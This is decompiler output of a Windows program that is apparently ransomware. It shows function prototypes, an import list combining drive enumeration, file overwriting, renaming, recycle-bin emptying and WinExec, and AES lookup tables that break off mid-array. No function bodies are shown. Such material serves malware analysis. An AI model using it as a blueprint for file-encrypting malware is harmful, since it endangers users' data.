/* This file was generated by the Hex-Rays decompiler version 8.3.0.230608.
   Copyright (c) 2007-2021 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>

#include <stdarg.h>


//-------------------------------------------------------------------------
// Function declarations

#define __thiscall __cdecl // Test compile in C mode

void __thiscall sub_401000(std::exception *this);
std::exception *__thiscall sub_401010(std::exception *this, char a2);
int __cdecl sub_401040(int a1);
// int __usercall sub_401240@<eax>(const void *a1@<eax>, int a2@<ecx>);
// int __userpurge sub_4012B0@<eax>(unsigned __int8 *a1@<ebx>, _DWORD *Buf);
// const void **__usercall sub_401330@<eax>(const void *a1@<eax>, unsigned int a2@<edi>, int a3@<esi>);
// const void **__userpurge sub_401400@<eax>(const void **a1@<ecx>, unsigned int a2@<eax>, unsigned int a3@<ebx>, const void **a4);
void *__stdcall sub_4014E0(const void **a1, unsigned int a2, size_t Size);
// _DWORD *__usercall sub_401650@<eax>(unsigned int a1@<eax>, unsigned int a2@<ecx>, _DWORD *a3@<esi>);
void *__thiscall sub_4016C0(size_t Size);
std::exception *__thiscall sub_401710(std::exception *this, struct exception *a2);
unsigned int __stdcall sub_401730(unsigned int a1, unsigned int a2);
char *__cdecl sub_4017B0(char *a1);
// char *__usercall sub_401980@<eax>(int *a1@<eax>, char *a2@<esi>);
int __cdecl sub_401A00(int a1, unsigned int a2, int a3, int a4);
// unsigned int __userpurge sub_401E20@<eax>(unsigned int a1@<ecx>, unsigned int a2@<esi>, _DWORD *a3);
// double __usercall sub_401EB0@<st0>(unsigned int a1@<eax>, _DWORD *a2@<ecx>, double a3);
// unsigned int __usercall sub_401F50@<eax>(_DWORD *a1@<esi>);
// _DWORD *__usercall sub_402010@<eax>(int a1@<eax>);
// int *__usercall sub_402160@<eax>(int a1@<eax>, int *a2@<edx>, unsigned __int8 *a3@<esi>);
// char *__usercall sub_402240@<eax>(_DWORD *a1@<eax>, char *a2@<esi>, int *a3);
// char *__usercall sub_402300@<eax>(_DWORD *a1@<eax>, char *a2@<edx>, int *a3);
// char *__usercall sub_4023E0@<eax>(_DWORD *a1@<ecx>, char *a2@<ebx>, _DWORD *a3);
// int *__usercall sub_402460@<eax>(int *a1@<ecx>, int *a2@<esi>);
int *__cdecl sub_4025C0(int *a1, int a2, int a3);
// int *__usercall sub_4028B0@<eax>(int *a1@<ecx>, int *a2@<esi>, int a3);
int __cdecl sub_4029A0(int a1, int a2);
int __cdecl sub_402A40(int a1, int a2);
// bool __usercall sub_402B10@<al>(char *a1@<edi>, char *a2@<esi>);
// bool __usercall sub_402B80@<al>(char *a1@<edi>, char *a2@<esi>);
// BOOL __usercall sub_402BF0@<eax>(char *a1@<eax>, char *a2);
void __cdecl sub_402C40(int a1, char a2);
int __fastcall sub_4031E0(int *a1, int *a2, int a3, int a4);
// int *__usercall sub_403390@<eax>(int *a1@<ebx>, int a2, int a3);
int *__cdecl sub_403640(int *a1, int a2, int a3);
// int *__userpurge sub_403930@<eax>(int *a1@<ecx>, int *a2, int a3, char a4, int a5, int a6, int a7, int a8, int a9, int a10, int a11, int a12, int a13, int a14, int a15, int a16, int a17, int a18, int a19, int a20, int a21, int a22, int a23, int a24, int a25, int a26, int a27, int a28, int a29, int a30, int a31, int a32, int a33, int a34, int a35, int a36, int a37, int a38, int a39, int a40, int a41, int a42, int a43, int a44, int a45, int a46, int a47, int a48, int a49, int a50, int a51, int a52, int a53, int a54, int a55, int a56, int a57, int a58, int a59, int a60, int a61, int a62, int a63);
// int *__userpurge sub_404010@<eax>(int *a1, int a2, char a3, int a4, int a5, int a6, int a7, int a8, int a9, int a10, int a11, int a12, int a13, int a14, int a15, int a16, int a17, int a18, int a19, int a20, int a21, int a22, int a23, int a24, int a25, int a26, int a27, int a28, int a29, int a30, int a31, int a32, int a33, int a34, int a35, int a36, int a37, int a38, int a39, int a40, int a41, int a42, int a43, int a44, int a45, int a46, int a47, int a48, int a49, int a50, int a51, int a52, int a53, int a54, int a55, int a56, int a57, int a58, int a59, int a60, int a61, int a62, int a63);
// int __userpurge sub_4043C0@<eax>(int *a1@<eax>, _BYTE *a2@<edi>, int Size);
int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd);
int __stdcall sub_404640(int a1, int a2, int a3, int a4);
// int *__usercall sub_404650@<eax>(int *a1@<esi>, void *a2, int a3, int a4, int a5, int a6, unsigned int a7);
// void __usercall sub_404980(void **a1@<ebx>);
// char __userpurge sub_4049C0@<al>(_DWORD *a1@<ebx>, wchar_t *Source);
// int __usercall sub_404A50@<eax>(int a1@<esi>);
// bool __usercall sub_404AD0@<al>(int a1@<ebx>);
bool __stdcall sub_404F10(int a1, wchar_t *lpFileName, unsigned __int64 a3);
char __stdcall sub_405370(wchar_t *a1);
char __thiscall sub_4057B0(void *this);
// char __usercall sub_405AD0@<al>(wchar_t *Source@<ecx>, int a2@<edi>);
// bool __userpurge sub_405DC0@<al>(const void *a1@<edi>, void *a2@<esi>, int a3, int a4);
// __int64 __userpurge sub_405E50@<edx:eax>(void *a1@<ebx>, unsigned __int64 a2);
unsigned int __fastcall sub_405EF0(unsigned int a1, int a2, _DWORD *a3, int a4);
int __thiscall sub_406210(int *this, unsigned __int8 *a2);
// int __usercall sub_4066E0@<eax>(int a1@<esi>);
// int __usercall sub_406870@<eax>(char *a1@<edx>, char *Format, ...);
std::exception *__thiscall sub_406890(std::exception *this, struct exception *a2);
// void __cdecl __noreturn std::_Xlength_error(const char *); idb
std::exception *__thiscall sub_4068DD(std::exception *this, struct exception *a2);
// void __cdecl __noreturn std::_Xout_of_range(const char *); idb
std::exception *__thiscall sub_40692A(std::exception *this, struct exception *a2);
std::exception *__thiscall sub_406947(std::exception *this, char a2);
// unsigned int __cdecl std::tr1::_Random_device(std::tr1 *__hidden this); idb
// void *__cdecl operator new[](unsigned int); idb
// void __fastcall __security_check_cookie(uintptr_t StackCookie);
// void __thiscall std::exception::_Tidy(std::exception *__hidden this); idb
// _DWORD __thiscall std::exception::exception(std::exception *__hidden this, const char *const *); idb
void __thiscall sub_406AA9(std::exception *this);
std::exception *__thiscall sub_406AB4(std::exception *this, char a2);
// _DWORD __thiscall std::exception::exception(std::exception *__hidden this, const struct exception *); idb
// void *__cdecl memcpy(void *, const void *Src, size_t Size);
// void *__cdecl memchr(const void *Buf, int Val, size_t MaxCount);
// _LocaleUpdate *__thiscall _LocaleUpdate::_LocaleUpdate(_LocaleUpdate *__hidden this, struct localeinfo_struct *); idb
// int __cdecl isalnum(int C);
// void __cdecl operator delete(void *); idb
void __thiscall sub_4070B4(struct type_info *this);
struct type_info *__thiscall sub_4070C4(struct type_info *this, char a2);
// void *__cdecl operator new(size_t Size); idb
// void __cdecl _wassert(const wchar_t *Message, const wchar_t *File, unsigned int Line);
// void __cdecl operator delete[](void *); idb
// int __cdecl atexit(void (__cdecl *)());
// errno_t __cdecl wcsncpy_s(wchar_t *Destination, rsize_t SizeInWords, const wchar_t *Source, rsize_t MaxCount);
// int __cdecl vsprintf_s(char *const Buffer, const size_t BufferCount, const char *const Format, va_list ArgList);
// int __cdecl _wrename(const wchar_t *OldFileName, const wchar_t *NewFileName);
// errno_t __cdecl wcsncat_s(wchar_t *Destination, rsize_t SizeInWords, const wchar_t *Source, rsize_t MaxCount);
// errno_t __cdecl wcscat_s(wchar_t *Destination, rsize_t SizeInWords, const wchar_t *Source);
// wchar_t *__cdecl wcstok(wchar_t *String, const wchar_t *Delimiter, wchar_t **Context);
// errno_t __cdecl wcscpy_s(wchar_t *Destination, rsize_t SizeInWords, const wchar_t *Source);
// void __stdcall __noreturn _CxxThrowException(void *pExceptionObject, _ThrowInfo *pThrowInfo);
void *__cdecl sub_407FF3(void *a1);
int sub_4084B8();
// int _encoded_null(void); weak
// void __cdecl type_info::_Type_info_dtor(struct type_info *); idb
void *__cdecl sub_409518(void *a1);
void *__cdecl sub_40954F(void *a1);
// _DWORD __cdecl flsall(_DWORD); weak
int sub_4099E6();
void **sub_409B71();
PVOID sub_40A099();
int __cdecl sub_40A249(int a1, int a2, int a3);
// LONG __stdcall __CxxUnhandledExceptionFilter(struct _EXCEPTION_POINTERS *ExceptionInfo); idb
int sub_40B759();
void *sub_40C12E();
void __cdecl sub_40C154(); // idb
void sub_40C233();
// void *__cdecl memset(void *, int Val, size_t Size);
// void *__cdecl memcpy_0(void *, const void *Src, size_t Size);
int __cdecl sub_40E93B(int a1);
HANDLE sub_40FC04();
// int __cdecl _wcsicmp(const wchar_t *String1, const wchar_t *String2);
void __thiscall sub_410FD1(std::exception *this);
std::exception *__thiscall sub_410FDC(std::exception *this, char a2);
std::exception *__thiscall sub_411BAB(std::exception *this, struct exception *a2);
int __cdecl sub_411D2D(_DWORD *a1, int a2, struct localeinfo_struct *a3);
int __cdecl sub_411DD5(_DWORD *a1, int a2, struct localeinfo_struct *a3);
int __cdecl sub_412206(unsigned __int16 *a1, _DWORD *a2);
int __cdecl sub_412757(unsigned __int16 *a1, _DWORD *a2);
// _DWORD __cdecl __strgtold12_l(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); weak
void sub_414480();
int sub_414500();
int sub_414530();
void sub_414560();
void __cdecl sub_4145E0(); // idb
void __cdecl sub_414610(); // idb
void __cdecl sub_41463E(); // idb

//-------------------------------------------------------------------------
// Data declarations

// extern HGDIOBJ (__stdcall *GetStockObject)(int i);
// extern BOOL (__stdcall *HeapSetInformation)(HANDLE HeapHandle, HEAP_INFORMATION_CLASS HeapInformationClass, PVOID HeapInformation, SIZE_T HeapInformationLength);
// extern BOOL (__stdcall *GetComputerNameA)(LPSTR lpBuffer, LPDWORD nSize);
// extern DWORD (__stdcall *GetFileSize)(HANDLE hFile, LPDWORD lpFileSizeHigh);
// extern HANDLE (__stdcall *FindFirstFileW)(LPCWSTR lpFileName, LPWIN32_FIND_DATAW lpFindFileData);
// extern UINT (__stdcall *GetDriveTypeW)(LPCWSTR lpRootPathName);
// extern BOOL (__stdcall *SetEndOfFile)(HANDLE hFile);
// extern BOOL (__stdcall *SetFilePointerEx)(HANDLE hFile, LARGE_INTEGER liDistanceToMove, PLARGE_INTEGER lpNewFilePointer, DWORD dwMoveMethod);
// extern DWORD (__stdcall *GetLogicalDrives)();
// extern BOOL (__stdcall *WriteFile)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
// extern BOOL (__stdcall *ReadFile)(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
// extern HANDLE (__stdcall *CreateFileW)(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// extern DWORD (__stdcall *GetLastError)();
// extern BOOL (__stdcall *RemoveDirectoryW)(LPCWSTR lpPathName);
// extern BOOL (__stdcall *FindNextFileW)(HANDLE hFindFile, LPWIN32_FIND_DATAW lpFindFileData);
// extern UINT (__stdcall *WinExec)(LPCSTR lpCmdLine, UINT uCmdShow);
// extern BOOL (__stdcall *CloseHandle)(HANDLE hObject);
// extern BOOL (__stdcall *FindClose)(HANDLE hFindFile);
// extern HANDLE (__stdcall *CreateMutexW)(LPSECURITY_ATTRIBUTES lpMutexAttributes, BOOL bInitialOwner, LPCWSTR lpName);
// extern PVOID (__stdcall *EncodePointer)(PVOID Ptr);
// extern PVOID (__stdcall *DecodePointer)(PVOID Ptr);
// extern FARPROC (__stdcall *GetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
// extern HMODULE (__stdcall *LoadLibraryW)(LPCWSTR lpLibFileName);
// extern LPTOP_LEVEL_EXCEPTION_FILTER (__stdcall *SetUnhandledExceptionFilter)(LPTOP_LEVEL_EXCEPTION_FILTER lpTopLevelExceptionFilter);
// extern BOOL (__stdcall *IsProcessorFeaturePresent)(DWORD ProcessorFeature);
// extern BOOL (__stdcall *SHGetSpecialFolderPathW)(HWND hwnd, LPWSTR pszPath, int csidl, BOOL fCreate);
// extern HRESULT (__stdcall *SHEmptyRecycleBinW)(HWND hwnd, LPCWSTR pszRootPath, DWORD dwFlags);
// extern BOOL (__stdcall *ShowWindow)(HWND hWnd, int nCmdShow);
// extern HWND (__stdcall *CreateWindowExW)(DWORD dwExStyle, LPCWSTR lpClassName, LPCWSTR lpWindowName, DWORD dwStyle, int X, int Y, int nWidth, int nHeight, HWND hWndParent, HMENU hMenu, HINSTANCE hInstance, LPVOID lpParam);
// extern ATOM (__stdcall *RegisterClassW)(const WNDCLASSW *lpWndClass);
// extern int (__stdcall *GetSystemMetrics)(int nIndex);
// extern LONG (__stdcall *SetWindowLongW)(HWND hWnd, int nIndex, LONG dwNewLong);
// extern HCURSOR (__stdcall *LoadCursorW)(HINSTANCE hInstance, LPCWSTR lpCursorName);
void *std::logic_error::`vftable' = &sub_406947; // weak
void *std::length_error::`vftable' = &sub_406947; // weak
void *std::out_of_range::`vftable' = &sub_406947; // weak
void *std::exception::`vftable' = &sub_406AB4; // weak
void *type_info::`vftable' = &sub_4070C4; // weak
void *std::bad_alloc::`vftable' = &sub_401010; // weak
_UNKNOWN unk_41744C; // weak
const wchar_t word_41748C = 0u; // idb
char RijnDael_AES_LONG_4174C8[256] =
{
  'c',
  '|',
  'w',
  '{',
  '\xF2',
  'k',
  'o',
  '\xC5',
  '0',
  '\x01',
  'g',
  '+',
  '\xFE',
  '\xD7',
  '\xAB',
  'v',
  '\xCA',
  '\x82',
  '\xC9',
  '}',
  '\xFA',
  'Y',
  'G',
  '\xF0',
  '\xAD',
  '\xD4',
  '\xA2',
  '\xAF',
  '\x9C',
  '\xA4',
  'r',
  '\xC0',
  '\xB7',
  '\xFD',
  '\x93',
  '&',
  '6',
  '?',
  '\xF7',
  '\xCC',
  '4',
  '\xA5',
  '\xE5',
  '\xF1',
  'q',
  '\xD8',
  '1',
  '\x15',
  '\x04',
  '\xC7',
  '#',
  '\xC3',
  '\x18',
  '\x96',
  '\x05',
  '\x9A',
  '\a',
  '\x12',
  '€',
  '\xE2',
  '\xEB',
  '\'',
  '\xB2',
  'u',
  '\t',
  '\x83',
  ',',
  '\x1A',
  '\x1B',
  'n',
  'Z',
  '\xA0',
  'R',
  ';',
  '\xD6',
  '\xB3',
  ')',
  '\xE3',
  '/',
  '\x84',
  'S',
  '\xD1',
  '\0',
  '\xED',
  ' ',
  '\xFC',
  '\xB1',
  '[',
  'j',
  '\xCB',
  '\xBE',
  '9',
  'J',
  'L',
  'X',
  '\xCF',
  '\xD0',
  '\xEF',
  '\xAA',
  '\xFB',
  'C',
  'M',
  '3',
  '\x85',
  'E',
  '\xF9',
  '\x02',
  '\x7F',
  'P',
  '<',
  '\x9F',
  '\xA8',
  'Q',
  '\xA3',
  '@',
  '\x8F',
  '\x92',
  '\x9D',
  '8',
  '\xF5',
  '\xBC',
  '\xB6',
  '\xDA',
  '!',
  '\x10',
  '\xFF',
  '\xF3',
  '\xD2',
  '\xCD',
  '\f',
  '\x13',
  '\xEC',
  '_',
  '\x97',
  'D',
  '\x17',
  '\xC4',
  '\xA7',
  '~',
  '=',
  'd',
  ']',
  '\x19',
  's',
  '`',
  '\x81',
  'O',
  '\xDC',
  '\"',
  '*',
  '\x90',
  '\x88',
  'F',
  '\xEE',
  '\xB8',
  '\x14',
  '\xDE',
  '^',
  '\v',
  '\xDB',
  '\xE0',
  '2',
  ':',
  '\n',
  'I',
  '\x06',
  '$',
  '\\',
  '\xC2',
  '\xD3',
  '\xAC',
  'b',
  '\x91',
  '\x95',
  '\xE4',
  'y',
  '\xE7',
  '\xC8',
  '7',
  'm',
  '\x8D',
  '\xD5',
  'N',
  '\xA9',
  'l',
  'V',
  '\xF4',
  '\xEA',
  'e',
  'z',
  '\xAE',
  '\b',
  '\xBA',
  'x',
  '%',
  '.',
  '\x1C',
  '\xA6',
  '\xB4',
  '\xC6',
  '\xE8',
  '\xDD',
  't',
  '\x1F',
  'K',
  '\xBD',
  '\x8B',
  '\x8A',
  'p',
  '>',
  '\xB5',
  'f',
  'H',
  '\x03',
  '\xF6',
  '\x0E',
  'a',
  '5',
  'W',
  '\xB9',
  '\x86',
  '\xC1',
  '\x1D',
  '\x9E',
  '\xE1',
  '\xF8',
  '\x98',
  '\x11',
  'i',
  '\xD9',
  '\x8E',
  '\x94',
  '\x9B',
  '\x1E',
  '\x87',
  '\xE9',
  '\xCE',
  'U',
  '(',
  '\xDF',
  '\x8C',
  '\xA1',
  '\x89',
  '\r',
  '\xBF',
  '\xE6',
  'B',
  'h',
  'A',
  '\x99',
  '-',
  '\x0F',
  '\xB0',
  'T',
  '\xBB',
  '\x16'
}; // weak
int dword_4175C8[256] =
{
  -1520213050,
  -2072216328,
  -1720223762,
  -1921287178,
  234025727,
  -1117033514,
  -1318096930,
  1422247313,
  1345335392,
  50397442,
  -1452841010,
  2099981142,
  436141799,
  1658312629,
  -424957107,
  -1703512340,
  1170918031,
  -1652391393,
  1086966153,
  -2021818886,
  368769775,
  -346465870,
  -918075506,
  200339707,
  -324162239,
  1742001331,
  -39673249,
  -357585083,
  -1080255453,
  -140204973,
  -1770884380,
  1539358875,
  -1028147339,
  486407649,
  -1366060227,
  1780885068,
  1513502316,
  1094664062,
  49805301,
  1338821763,
  1546925160,
  -190470831,
  887481809,
  150073849,
  -1821281822,
  1943591083,
  1395732834,
  1058346282,
  201589768,
  1388824469,
  1696801606,
  1589887901,
  672667696,
  -1583966665,
  251987210,
  -1248159185,
  151455502,
  907153956,
  -1686077413,
  1038279391,
  652995533,
  1764173646,
  -843926913,
  -1619692054,
  453576978,
  -1635548387,
  1949051992,
  773462580,
  756751158,
  -1301385508,
  -296068428,
  -73359269,
  -162377052,
  1295727478,
  1641469623,
  -827083907,
  2066295122,
  1055122397,
  1898917726,
  -1752923117,
  -179088474,
  1758581177,
  0,
  753790401,
  1612718144,
  536673507,
  -927878791,
  -312779850,
  -1100322092,
  1187761037,
  -641810841,
  1262041458,
  -565556588,
  -733197160,
  -396863312,
  1255133061,
  1808847035,
  720367557,
  -441800113,
  385612781,
  -985447546,
  -682799718,
  1429418854,
  -1803188975,
  -817543798,
  284817897,
  100794884,
  -2122350594,
  -263171936,
  1144798328,
  -1163944155,
  -475486133,
  -212774494,
  -22830243,
  -1069531008,
  -1970303227,
  -1382903233,
  -1130521311,
  1211644016,
  83228145,
  -541279133,
  -1044990345,
  1977277103,
  1663115586,
  806359072,
  452984805,
  250868733,
  1842533055,
  1288555905,
  336333848,
  890442534,
  804056259,
  -513843266,
  -1567123659,
  -867941240,
  957814574,
  1472513171,
  -223893675,
  -2105639172,
  1195195770,
  -1402706744,
  -413311558,
  723065138,
  -1787595802,
  -1604296512,
  -1736343271,
  -783331426,
  2145180835,
  1713513028,
  2116692564,
  -1416589253,
  -2088204277,
  -901364084,
  703524551,
  -742868885,
  1007948840,
  2044649127,
  -497131844,
  487262998,
  1994120109,
  1004593371,
  1446130276,
  1312438900,
  503974420,
  -615954030,
  168166924,
  1814307912,
  -463709000,
  1573044895,
  1859376061,
  -273896381,
  -1503501628,
  -1466855111,
  -1533700815,
  937747667,
  -1954973198,
  854058965,
  1137232011,
  1496790894,
  -1217565222,
  -1936880383,
  1691735473,
  -766620004,
  -525751991,
  -1267962664,
  -95005012,
  133494003,
  636152527,
  -1352309302,
  -1904575756,
  -374428089,
  403179536,
  -709182865,
  -2005370640,
  1864705354,
  1915629148,
  605822008,
  -240736681,
  -944458637,
  1371981463,
  602466507,
  2094914977,
  -1670089496,
  555687742,
  -582268010,
  -591544991,
  -2037675251,
  -2054518257,
  -1871679264,
  1111375484,
  -994724495,
  -1436129588,
  -666351472,
  84083462,
  32962295,
  302911004,
  -1553899070,
  1597322602,
  -111716434,
  -793134743,
  -1853454825,
  1489093017,
  656219450,
  -1180787161,
  954327513,
  335083755,
  -1281845205,
  856756514,
  -1150719534,
  1893325225,
  -1987146233,
  -1483434957,
  -1231316179,
  572399164,
  -1836611819,
  552200649,
  1238290055,
  -11184726,
  2015897680,
  2061492133,
  -1886614525,
  -123625127,
  -2138470135,
  386731290,
  -624967835,
  837215959,
  -968736124,
  -1201116976,
  -1019133566,
  -1332111063,
  1999449434,
  286199582,
  -877612933,
  -61582168,
  -692339859,
  974525996
}; // weak
int dword_4179C8[256] =
{
  1667483301,
  2088564868,
  2004348569,
  2071721613,
  -218956019,
  1802229437,
  1869602481,
  -976907948,
  808476752,
  16843267,
  1734856361,
  724260477,
  -16849127,
  -673729182,
  -1414836762,
  1987505306,
  -892694715,
  -2105401443,
  -909539008,
  2105408135,
  -84218091,
  1499050731,
  1195871945,
  -252642549,
  -1381154324,
  -724257945,
  -1566416899,
  -1347467798,
  -1667488833,
  -1532734473,
  1920132246,
  -1061119141,
  -1212713534,
  -33693412,
  -1819066962,
  640044138,
  909536346,
  1061125697,
  -134744830,
  -859012273,
  875849820,
  -1515892236,
  -437923532,
  -235800312,
  1903288979,
  -656888973,
  825320019,
  353708607,
  67373068,
  -943221422,
  589514341,
  -1010590370,
  404238376,
  -1768540255,
  84216335,
  -1701171275,
  117902857,
  303178806,
  -2139087973,
  -488448195,
  -336868058,
  656887401,
  -1296924723,
  1970662047,
  151589403,
  -2088559202,
  741103732,
  437924910,
  454768173,
  1852759218,
  1515893998,
  -1600103429,
  1381147894,
  993752653,
  -690571423,
  -1280082482,
  690573947,
  -471605954,
  791633521,
  -2071719017,
  1397991157,
  -774784664,
  0,
  -303185620,
  538984544,
  -50535649,
  -1313769016,
  1532737261,
  1785386174,
  -875852474,
  -1094817831,
  960066123,
  1246401758,
  1280088276,
  1482207464,
  -808483510,
  -791626901,
  -269499094,
  -1431679003,
  -67375850,
  1128498885,
  1296931543,
  859006549,
  -2054876780,
  1162185423,
  -101062384,
  33686534,
  2139094657,
  1347461360,
  1010595908,
  -1616960070,
  -1465365533,
  1364304627,
  -1549574658,
  1077969088,
  -1886452342,
  -1835909203,
  -1650646596,
  943222856,
  -168431356,
  -1128504353,
  -1229555775,
  -623202443,
  555827811,
  269492272,
  -6886,
  -202113778,
  -757940371,
  -842170036,
  202119188,
  320022069,
  -320027857,
  1600110305,
  -1751698014,
  1145342156,
  387395129,
  -993750185,
  -1482205710,
  2122251394,
  1027439175,
  1684326572,
  1566423783,
  421081643,
  1936975509,
  1616953504,
  -2122245736,
  1330618065,
  -589520001,
  572671078,
  707417214,
  -1869595733,
  -2004350077,
  1179028682,
  -286341335,
  -1195873325,
  336865340,
  -555833479,
  1583267042,
  185275933,
  -606360202,
  -522134725,
  842163286,
  976909390,
  168432670,
  1229558491,
  101059594,
  606357612,
  1549580516,
  -1027432611,
  -741098130,
  -1397996561,
  1650640038,
  -1852753496,
  -1785384540,
  -454765769,
  2038035083,
  -404237006,
  -926381245,
  926379609,
  1835915959,
  -1920138868,
  -707415708,
  1313774802,
  -1448523296,
  1819072692,
  1448520954,
  -185273593,
  -353710299,
  1701169839,
  2054878350,
  -1364310039,
  134746136,
  -1162186795,
  2021191816,
  623200879,
  774790258,
  471611428,
  -1499047951,
  -1263242297,
  -960063663,
  -387396829,
  -572677764,
  1953818780,
  522141217,
  1263245021,
  -1111662116,
  -1953821306,
  -1970663547,
  1886445712,
  1044282434,
  -1246400060,
  1718013098,
  1212715224,
  50529797,
  -151587071,
  235805714,
  1633796771,
  892693087,
  1465364217,
  -1179031088,
  -2038032495,
  -1044276904,
  488454695,
  -1633802311,
  -505292488,
  -117904621,
  -1734857805,
  286335539,
  1768542907,
  -640046736,
  -1903294583,
  -1802226777,
  -1684329034,
  505297954,
  -2021190254,
  -370554592,
  -825325751,
  1431677695,
  673730680,
  -538991238,
  -1936981105,
  -1583261192,
  -1987507840,
  218962455,
  -1077975590,
  -421079247,
  1111655622,
  1751699640,
  1094812355,
  -1718015568,
  757946999,
  252648977,
  -1330611253,
  1414834428,
  -1145344554,
  370551866
}; // weak
int dword_417DC8[256] =
{
  1673962851,
  2096661628,
  2012125559,
  2079755643,
  -218165774,
  1809235307,
  1876865391,
  -980331323,
  811618352,
  16909057,
  1741597031,
  727088427,
  -18408962,
  -675978537,
  -1420958037,
  1995217526,
  -896580150,
  -2111857278,
  -913751863,
  2113570685,
  -84994566,
  1504897881,
  1200539975,
  -251982864,
  -1388188499,
  -726439980,
  -1570767454,
  -1354372433,
  -1675378788,
  -1538000988,
  1927583346,
  -1063560256,
  -1217019209,
  -35578627,
  -1824674157,
  642542118,
  913070646,
  1065238847,
  -134937865,
  -863809588,
  879254580,
  -1521355611,
  -439274267,
  -235337487,
  1910674289,
  -659852328,
  828527409,
  355090197,
  67636228,
  -946515257,
  591815971,
  -1013096765,
  405809176,
  -1774739050,
  84545285,
  -1708149350,
  118360327,
  304363026,
  -2145674368,
  -488686110,
  -338876693,
  659450151,
  -1300247118,
  1978310517,
  152181513,
  -2095210877,
  743994412,
  439627290,
  456535323,
  1859957358,
  1521806938,
  -1604584544,
  1386542674,
  997608763,
  -692624938,
  -1283600717,
  693271337,
  -472039709,
  794718511,
  -2079090812,
  1403450707,
  -776378159,
  0,
  -306107155,
  541089824,
  -52224004,
  -1317418831,
  1538714971,
  1792327274,
  -879933749,
  -1100490306,
  963791673,
  1251270218,
  1285084236,
  1487988824,
  -813348145,
  -793023536,
  -272291089,
  -1437604438,
  -68348165,
  1132905795,
  1301993293,
  862344499,
  -2062445435,
  1166724933,
  -102166279,
  33818114,
  2147385727,
  1352724560,
  1014514748,
  -1624917345,
  -1471421528,
  1369633617,
  -1554121053,
  1082179648,
  -1895462257,
  -1841320558,
  -1658733411,
  946882616,
  -168753931,
  -1134305348,
  -1233665610,
  -626035238,
  557998881,
  270544912,
  -1762561,
  -201519373,
  -759206446,
  -847164211,
  202904588,
  321271059,
  -322752532,
  1606345055,
  -1758092649,
  1149815876,
  388905239,
  -996976700,
  -1487539545,
  2130477694,
  1031423805,
  1690872932,
  1572530013,
  422718233,
  1944491379,
  1623236704,
  -2129028991,
  1335808335,
  -593264676,
  574907938,
  710180394,
  -1875137648,
  -2012511352,
  1183631942,
  -288937490,
  -1200893000,
  338181140,
  -559449634,
  1589437022,
  185998603,
  -609388837,
  -522503200,
  845436466,
  980700730,
  169090570,
  1234361161,
  101452294,
  608726052,
  1555620956,
  -1029743166,
  -742560045,
  -1404833876,
  1657054818,
  -1858492271,
  -1791908715,
  -455919644,
  2045938553,
  -405458201,
  -930397240,
  929978679,
  1843050349,
  -1929278323,
  -709794603,
  1318900302,
  -1454776151,
  1826141292,
  1454176854,
  -185399308,
  -355523094,
  1707781989,
  2062847610,
  -1371018834,
  135272456,
  -1167075910,
  2029029496,
  625635109,
  777810478,
  473441308,
  -1504185946,
  -1267480652,
  -963161658,
  -389340184,
  -576619299,
  1961401460,
  524165407,
  1268178251,
  -1117659971,
  -1962047861,
  -1978694262,
  1893765232,
  1048330814,
  -1250835275,
  1724688998,
  1217452104,
  50726147,
  -151584266,
  236720654,
  1640145761,
  896163637,
  1471084887,
  -1184247623,
  -2045275770,
  -1046914879,
  490350365,
  -1641563746,
  -505857823,
  -118811656,
  -1741966440,
  287453969,
  1775418217,
  -643206951,
  -1912108658,
  -1808554092,
  -1691502949,
  507257374,
  -2028629369,
  -372694807,
  -829994546,
  1437269845,
  676362280,
  -542803233,
  -1945923700,
  -1587939167,
  -1995865975,
  219813645,
  -1083843905,
  -422104602,
  1115997762,
  1758509160,
  1099088705,
  -1725321063,
  760903469,
  253628687,
  -1334064208,
  1420360788,
  -1150429509,
  371997206
}; // weak
int dword_4181C8[256] =
{
  -962239645,
  -125535108,
  -291932297,
  -158499973,
  -15863054,
  -692229269,
  -558796945,
  -1856715323,
  1615867952,
  33751297,
  -827758745,
  1451043627,
  -417726722,
  -1251813417,
  1306962859,
  -325421450,
  -1891251510,
  530416258,
  -1992242743,
  -91783811,
  -283772166,
  -1293199015,
  -1899411641,
  -83103504,
  1106029997,
  -1285040940,
  1610457762,
  1173008303,
  599760028,
  1408738468,
  -459902350,
  -1688485696,
  1975695287,
  -518193667,
  1034851219,
  1282024998,
  1817851446,
  2118205247,
  -184354825,
  -2091922228,
  1750873140,
  1374987685,
  -785062427,
  -116854287,
  -493653647,
  -1418471208,
  1649619249,
  708777237,
  135005188,
  -1789737017,
  1181033251,
  -1654733885,
  807933976,
  933336726,
  168756485,
  800430746,
  235472647,
  607523346,
  463175808,
  -549592350,
  -853087253,
  1315514151,
  2144187058,
  -358648459,
  303761673,
  496927619,
  1484008492,
  875436570,
  908925723,
  -592286098,
  -1259447718,
  1543217312,
  -1527360942,
  1984772923,
  -1218324778,
  2110698419,
  1383803177,
  -583080989,
  1584475951,
  328696964,
  -1493871789,
  -1184312879,
  0,
  -1054020115,
  1080041504,
  -484442884,
  2043195825,
  -1225958565,
  -725718422,
  -1924740149,
  1742323390,
  1917532473,
  -1797371318,
  -1730917300,
  -1326950312,
  -2058694705,
  -1150562096,
  -987041809,
  1340451498,
  -317260805,
  -2033892541,
  -1697166003,
  1716859699,
  294946181,
  -1966127803,
  -384763399,
  67502594,
  -25067649,
  -1594863536,
  2017737788,
  632987551,
  1273211048,
  -1561112239,
  1576969123,
  -2134884288,
  92966799,
  1068339858,
  566009245,
  1883781176,
  -251333131,
  1675607228,
  2009183926,
  -1351230758,
  1113792801,
  540020752,
  -451215361,
  -49351693,
  -1083321646,
  -2125673011,
  403966988,
  641012499,
  -1020269332,
  -1092526241,
  899848087,
  -1999879100,
  775493399,
  -1822964540,
  1441965991,
  -58556802,
  2051489085,
  -928226204,
